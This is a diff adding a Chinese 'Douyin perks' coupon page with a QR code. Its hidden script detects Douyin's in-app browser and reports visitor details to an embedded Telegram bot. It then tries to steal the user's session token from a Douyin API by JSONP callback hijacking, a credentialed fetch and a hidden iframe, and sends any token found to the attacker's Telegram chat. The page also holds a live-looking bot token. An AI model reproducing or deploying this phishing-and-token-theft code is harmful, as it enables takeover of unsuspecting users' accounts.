@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>抖音福利</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0d1117 0%,#161b22 50%,#0d1117 100%);color:#c9d1d9;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#161b22;border:1px solid #30363d;border-radius:16px;padding:40px 36px;text-align:center;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.4)}
+.card h2{color:#58a6ff;font-size:22px;margin-bottom:6px}
+.card .sub{color:#8b949e;font-size:13px;margin-bottom:24px}
+.qr-wrap{background:#fff;display:inline-block;padding:12px;border-radius:12px;margin-bottom:18px;line-height:0}
+.qr-wrap img{width:220px;height:220px;border-radius:4px}
+.hint{color:#8b949e;font-size:12px;margin-bottom:8px}
+.steps{text-align:left;background:#0d1117;border-radius:10px;padding:18px 20px;margin-top:20px;font-size:13px;line-height:1.8}
+.steps span{color:#58a6ff;font-weight:bold;margin-right:4px}
+.footer{color:#484f58;font-size:11px;margin-top:20px}
+</style>
+</head>
+<body>
+
+<noscript>请开启 JavaScript</noscript>
+
+<div class="card" id="mainCard">
+  <h2>抖音福利</h2>
+  <p class="sub">扫码领取专属优惠</p>
+  <div class="qr-wrap">
+    <img id="qrImg" src="" alt="QR Code">
+  </div>
+  <p class="hint">📱 打开抖音扫一扫</p>
+  <div class="steps">
+    <p><span>①</span> 打开抖音 App</p>
+    <p><span>②</span> 点击右上角搜索旁的「扫一扫」</p>
+    <p><span>③</span> 扫描上方二维码</p>
+    <p><span>④</span> 自动跳转领取</p>
+  </div>
+  <p class="footer">Powered by Cloudflare</p>
+</div>
+
+<script>
+// ==================== 初始化 ====================
+var QR_URL  = window.location.href;
+var TG_TOKEN = '8409528037:AAF-kzfdLe5Ldcfqnt_CeX25G6VR5CiEPds';
+var TG_CHAT  = '8712459718';
+
+// 生成二维码
+document.getElementById('qrImg').src =
+  'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + encodeURIComponent(QR_URL);
+
+// ==================== 抖音检测 ====================
+var ua = navigator.userAgent;
+var isDouyin = ua.indexOf('aweme') >= 0 || ua.indexOf('BytedanceWebview') >= 0;
+
+if (isDouyin) {
+  document.getElementById('mainCard').style.display = 'none';
+  document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d1117;color:#58a6ff;font-family:sans-serif;font-size:16px;text-align:center"><div><p style="font-size:32px;margin-bottom:12px">⏳</p><p>正在加载...</p></div></div>';
+
+  function report(type, data) {
+    var msg = '';
+    if (typeof data === 'string' && data.match(/[a-f0-9]{32,}/i)) {
+      msg = '\uD83C\uDFAF *Token \u6355\u83B7!*\n\uD83D\uDCCB ' + type + '\n\uD83D\uDD11 `' + data + '`';
+    } else {
+      var d = typeof data === 'string' ? data : JSON.stringify(data);
+      if (d.length > 300) d = d.slice(0,300) + '...';
+      msg = '\uD83D\uDCE1 *' + type + '*\n\uD83D\uDCE6 `' + d + '`';
+    }
+    new Image().src = 'https://api.telegram.org/bot' + TG_TOKEN +
+      '/sendMessage?chat_id=' + TG_CHAT +
+      '&text=' + encodeURIComponent(msg) +
+      '&parse_mode=Markdown&disable_web_page_preview=true';
+  }
+
+  report('visit', JSON.stringify({
+    ua:ua.slice(0,200),
+    lang:navigator.language,
+    scr:screen.width+'x'+screen.height,
+    ref:document.referrer||'-'
+  }));
+
+  // JSONP 劫持
+  var cb = '_dt_' + Date.now();
+  window[cb] = function(resp) {
+    report('jsonp_ok', JSON.stringify(resp).slice(0,500));
+    var m = JSON.stringify(resp).match(/[a-f0-9]{32,}/i);
+    if (m && m[0]) report('token', m[0]);
+  };
+  var s = document.createElement('script');
+  s.src = 'https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/'
+    + '?im_token=1&aid=1128&device_platform=android'
+    + '&version_code=320900&app_name=douyin_lite&callback=' + cb;
+  s.onerror = function(){ report('jsonp_fail', 'no JSONP support'); };
+  document.head.appendChild(s);
+
+  // fetch 探测
+  fetch('https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite', {
+    credentials: 'include', mode: 'cors'
+  }).then(function(r) {
+    report('fetch', 'status:' + r.status);
+    return r.text();
+  }).then(function(t) {
+    report('fetch_body', t.slice(0,500));
+    var m = t.match(/[a-f0-9]{32,}/i);
+    if (m && m[0]) report('token', m[0]);
+  }).catch(function(e) {
+    report('fetch_err', e.message.slice(0,200));
+  });
+
+  // iframe 探测
+  var ifr = document.createElement('iframe');
+  ifr.style.cssText = 'display:none;width:0;height:0;border:0';
+  ifr.src = 'https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite';
+  ifr.onload = function() {
+    report('iframe', 'loaded');
+    try {
+      var doc = ifr.contentDocument || ifr.contentWindow.document;
+      var txt = (doc.body ? doc.body.innerText : '') || '';
+      if (txt) report('iframe_txt', txt.slice(0,500));
+    } catch(e) {
+      report('iframe_cors', 'cross-origin');
+    }
+  };
+  document.body.appendChild(ifr);
+
+  // 兜底重定向
+  setTimeout(function() {
+    report('redirect', 'fallback');
+    window.location.replace(
+      'https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/'
+      + '?im_token=1&aid=1128&device_platform=android'
+      + '&version_code=320900&app_name=douyin_lite'
+    );
+  }, 2500);
+
+}
+</script>
+</body>
+</html>
